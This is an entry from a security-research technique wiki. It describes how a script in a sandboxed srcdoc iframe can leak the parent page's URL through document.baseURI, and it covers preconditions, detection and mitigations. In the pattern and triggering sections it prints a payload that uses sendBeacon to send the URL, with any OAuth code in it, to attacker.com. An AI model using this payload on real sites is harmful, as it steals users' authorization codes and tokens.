---
title: Sandbox srcdoc baseURI Leak
slug: sandbox-srcdoc-base-uri-leak
created_utc: 2026-05-14T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/dom-xss, technique/iframe, technique/info-leak]
inbound: []
---

# Sandbox srcdoc baseURI Leak

## Pattern

A sandboxed iframe (`<iframe sandbox>`) is normally isolated from its
parent by a null origin - same-origin policy blocks DOM access into the
parent. However, when the iframe content is supplied via the `srcdoc`
attribute (not `src`), the iframe inherits a `document.baseURI` pointing
at the **top-level page's URL** (the base URI is resolved relative to
where the srcdoc'd HTML was authored - the top frame).

Reading `document.baseURI` from inside the sandboxed iframe therefore
leaks the top frame's URL without needing `allow-same-origin`. Useful
chain:

- Top frame is a sensitive callback page (`/oauth/callback?code=...`).
- Attacker embeds a sandboxed `<iframe srcdoc="<script>navigator.sendBeacon(
  '//attacker.com', document.baseURI)</script>">`.
- baseURI contains the OAuth code; exfiltrated.

Researcher: Johan Carlsson XSS challenge solution.

## Preconditions

- Attacker controls a sandboxed iframe inserted into the victim page
  (sometimes via a `srcdoc=`-accepting widget, sometimes via an HTML
  injection that survives a sandbox-only sanitizer).
- Sandbox config allows `allow-scripts` (without `allow-same-origin`).
- The top-frame URL carries the secret of interest (OAuth code,
  authorization token in fragment, CSRF nonce).

## Detection

- Inspect any place the application embeds user-influenced HTML inside
  an `<iframe srcdoc>`.
- `js_analyzer`: tag `iframe.srcdoc = userInput`.
- Confirm `document.baseURI` returns top-frame URL by injecting a probe.

## Triggering

```html
<!-- Attacker payload injected into a srcdoc-using widget -->
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    navigator.sendBeacon('https://attacker.com/leak',
                         document.baseURI);
  </script>"></iframe>
```

## Bypasses

- Page sets `<base href="...">` to override baseURI - but the override is
  visible only after parse, and the leaked value is still the document
  base used by the srcdoc parser.
- CSP `frame-src 'none'` or `sandbox` directive on the parent CSP - full
  mitigation.

## Seen in the wild

- {date: 2024-05-30, source: CT Ep 73} - Johan Carlsson's XSS challenge used this exact technique to escape a sandbox and leak the top-frame URL.

## References

- HTML spec - iframe srcdoc & baseURI resolution.
- Critical Thinking Podcast Ep 73 - <https://www.youtube.com/watch?v=uHOxsmdsXUA>
- Related: [[sandbox-window-open-null-origin]], [[iframe-without-csp-proxy]]
